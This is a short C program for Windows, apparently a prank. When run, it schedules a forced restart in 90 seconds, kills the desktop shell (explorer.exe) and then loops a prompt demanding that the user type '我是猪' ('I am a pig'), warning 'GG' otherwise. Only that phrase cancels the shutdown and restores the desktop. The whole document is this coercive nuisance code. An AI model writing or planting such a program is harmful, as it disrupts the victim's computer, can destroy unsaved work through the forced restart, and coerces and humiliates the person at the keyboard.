#include<stdio.h>
#include<string.h>
#include<stdlib.h>
int main()
{
    char a[12],b[12]={"我是猪"};
    system("shutdown -r -t 90");
    system("taskkill/im explorer.exe /f");
    system("cls");
    bug: printf("说你是猪，不然GG\n");
       scanf("%s",a);
       if(strcmp(a,b)==0)
       {
           system("shutdown -a");
           system("explorer.exe");
       }
       else goto bug;
}
